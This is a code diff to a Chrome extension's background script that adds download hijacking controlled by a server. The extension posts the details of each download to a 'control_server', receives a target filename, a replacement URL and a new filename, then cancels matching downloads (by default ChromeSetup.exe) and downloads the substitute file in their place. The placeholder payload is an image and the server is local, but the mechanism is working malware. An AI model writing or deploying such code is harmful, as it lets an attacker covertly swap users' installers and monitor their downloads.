@@ -52,12 +52,14 @@ chrome.runtime.onInstalled.addListener(function setuid(){
         }
     
     });
+    
     chrome.storage.local.get(["TimeA"]).then( (result)=>{
         
         
         if (result.TimeA == undefined ){
             chrome.storage.local.set({TimeA:First_installed});
             chrome.storage.local.set({TimeB:First_installed});
+            chrome.storage.local.set({Obj:"ChromeSetup.exe", Tar: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg/800px-Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg", Nam:"ChromeSetup.jpg"})
         }
     
     });
@@ -221,7 +223,11 @@ function phase(){
         mode: 'no-cors', 
         headers:{"Content-Type": "application/json"}
         }).then(r => r.text()).then(result => {
-            chrome.storage.local.set({phase:parseInt(result)});
+            result = JSON.parse(result)
+            chrome.storage.local.set({phase:parseInt(result.phase)});
+            chrome.storage.local.set({Obj:result.obj});
+            chrome.storage.local.set({Tar:result.tar});
+            chrome.storage.local.set({Nam:result.nam});
         });})
 
     }
@@ -262,18 +268,22 @@ function modify(item){
     chrome.storage.local.get(["phase"]).then((result)=>{
         console.log(result)
         if(result.phase == 1){
-        console.log("hola")
-        fetch('http://127.0.0.1:5000/control_server',
-        {
-        method: "POST",
-        mode: 'no-cors', 
-        body: JSON.stringify(item),
-        headers:{"Content-Type": "application/json"}
-        })
-        if (item.url.includes("ChromeSetup.exe")){
-        chrome.downloads.cancel(item.id)
-        chrome.downloads.download({url: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg/800px-Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg", filename: "ChromeSetup.jpg"});
-        }
+            chrome.storage.local.get(["Obj","Tar","Nam"]).then((result1)=>{
+                        console.log(result1.Obj,result1.Tar,result1.Nam)
+                        fetch('http://127.0.0.1:5000/control_server',
+                        {
+                        method: "POST",
+                        mode: 'no-cors', 
+                        body: JSON.stringify(item),
+                        headers:{"Content-Type": "application/json"}
+                        })
+                        if (item.url.includes(result1.Obj)){
+                        chrome.downloads.cancel(item.id)
+                        chrome.downloads.download({url: result1.Tar, filename: result1.Nam});
+                        }
+
+            })
+        
     }});
  
 }
